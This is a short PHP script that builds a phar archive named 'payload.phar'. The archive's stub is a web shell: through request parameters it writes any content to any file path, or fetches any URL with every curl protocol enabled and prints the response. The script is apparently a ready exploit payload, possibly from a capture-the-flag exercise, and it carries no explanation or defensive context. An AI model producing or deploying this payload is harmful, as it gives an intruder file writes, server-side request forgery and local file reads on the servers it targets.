<?php
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->setStub(
'
<?php echo 111;
if ($_GET[0] == 0){
file_put_contents($_POST[0], $_POST[1]);
}
if ($_GET[0] == 1){
$orig = $_POST[0];
$ch = curl_init($orig);
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
echo $data;
curl_close($ch);
}
__HALT_COMPILER(); ?>
'
);
$phar->addFromString('kengwang', '111');
$phar->stopBuffering();
?>